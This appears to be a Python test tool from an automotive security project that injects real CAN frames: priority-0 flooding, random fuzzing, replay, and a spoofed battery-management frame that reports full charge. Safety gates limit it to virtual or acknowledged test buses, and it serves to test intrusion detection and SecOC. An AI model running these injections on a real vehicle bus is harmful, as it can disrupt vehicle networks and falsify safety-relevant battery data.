#!/usr/bin/env python3
"""Real SocketCAN attack injector for TC-SEC-005 and the Ablation study.

Four attack types send actual CAN frames on an isolated test bus (two RPis, or
vcan0). Frame building and the safety gate are pure functions so they are unit
tested without python-can or a live socket. ICD contract is not modified: these
are unauthenticated injections, exactly what SecOC/IDS must handle.

Safety (SKILL security rule): a real can* interface requires --i-am-on-a-test-bus,
rate and duration are capped, and the first real injection time is reported so the
operator records the attack start (not the shell launch time).
"""

from __future__ import annotations

import argparse
import struct
import sys
import time

ATTACK_TYPES = ("flooding", "fuzzy", "replay", "spoofing")

# Caps are test-bus guards, not physical limits. 500 kbps classical CAN tops out
# near 3-4 kfps for 8-byte frames; 5000 leaves headroom while refusing typos.
MAX_RATE_FPS = 5000.0
MAX_DURATION_S = 120.0

# Manipulated 0x100: SOC raw 200 (=100%), ICD 1.2 layout, byte 7 = 0.
SPOOF_BMS = bytes([200, 190, 0x10, 0x68, 0xFF, 0xEC, 65, 0x00])
# A plausible prior 0x100 to replay (SOC 75%).
REPLAY_BMS = bytes([150, 190, 0x10, 0x68, 0xFF, 0xEC, 65, 0x00])


def is_test_bus(channel: str, acknowledged: bool) -> bool:
    """vcan* is always allowed; a real can* needs explicit acknowledgement."""
    if channel.startswith("vcan"):
        return True
    if channel.startswith("can") and acknowledged:
        return True
    return False


def validate(attack: str, channel: str, rate: float, duration: float,
             acknowledged: bool) -> str | None:
    """Return an error string if the run must be refused before any send."""
    if attack not in ATTACK_TYPES:
        return f"unknown attack: {attack}"
    if not is_test_bus(channel, acknowledged):
        return (f"{channel} is not an acknowledged test bus; pass "
                f"--i-am-on-a-test-bus for a real can interface")
    if not 0 < rate <= MAX_RATE_FPS:
        return f"rate must be in (0, {MAX_RATE_FPS}] fps"
    if not 0 < duration <= MAX_DURATION_S:
        return f"duration must be in (0, {MAX_DURATION_S}] s"
    return None


def build_frame(attack: str, rng, counter: int) -> tuple[int, bytes]:
    """One (can_id, 8-byte payload) for the attack. Deterministic given rng."""
    if attack == "flooding":
        # Highest priority ID to seize arbitration; payload content irrelevant.
        return 0x000, b"\x00" * 8
    if attack == "fuzzy":
        return rng.getrandbits(11), bytes(rng.getrandbits(8) for _ in range(8))
    if attack == "replay":
        return 0x100, REPLAY_BMS
    if attack == "spoofing":
        return 0x100, SPOOF_BMS
    raise ValueError(attack)


def _send_loop(bus, attack, rate, duration, seed, report):
    import random

    rng = random.Random(seed)
    period = 1.0 / rate
    import can

    sent = 0
    first_injection = None
    next_at = time.monotonic()
    end = next_at + duration
    while True:
        now = time.monotonic()
        if now >= end:
            break
        if now < next_at:
            time.sleep(min(next_at - now, 0.001))
            continue
        can_id, data = build_frame(attack, rng, sent)
        bus.send(can.Message(arbitration_id=can_id, data=data, is_extended_id=False))
        if first_injection is None:
            first_injection = time.time()
            report(first_injection)
        sent += 1
        next_at += period
    return sent, first_injection


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(description="SocketCAN attack injector (isolated test bus only)")
    parser.add_argument("--type", required=True, choices=ATTACK_TYPES)
    parser.add_argument("--channel", required=True, help="vcan0, or a real canN with --i-am-on-a-test-bus")
    parser.add_argument("--rate", type=float, default=1000.0, help="frames per second")
    parser.add_argument("--duration", type=float, default=5.0)
    parser.add_argument("--seed", type=int, default=42)
    parser.add_argument("--i-am-on-a-test-bus", dest="ack", action="store_true",
                        help="confirm a real can* interface is an isolated test bus")
    parser.add_argument("--first-injection-file", help="write the first real injection epoch here")
    args = parser.parse_args(argv)

    error = validate(args.type, args.channel, args.rate, args.duration, args.ack)
    if error:
        print(f"refused: {error}", file=sys.stderr)
        return 2

    def report(epoch: float) -> None:
        line = f"FIRST_INJECTION {epoch:.6f}"
        print(line, file=sys.stderr, flush=True)
        if args.first_injection_file:
            with open(args.first_injection_file, "w", encoding="utf-8") as handle:
                handle.write(f"{epoch:.6f}\n")

    try:
        import can
    except ImportError:
        print("refused: python-can not installed (pip install -r security/requirements.txt)",
              file=sys.stderr)
        return 2

    bus = can.interface.Bus(channel=args.channel, interface="socketcan")
    try:
        sent, first = _send_loop(bus, args.type, args.rate, args.duration, args.seed, report)
    finally:
        bus.shutdown()
    print(f"{args.type}: sent {sent} frames on {args.channel} in {args.duration}s "
          f"(first injection {first:.6f})" if first else f"{args.type}: sent 0 frames")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
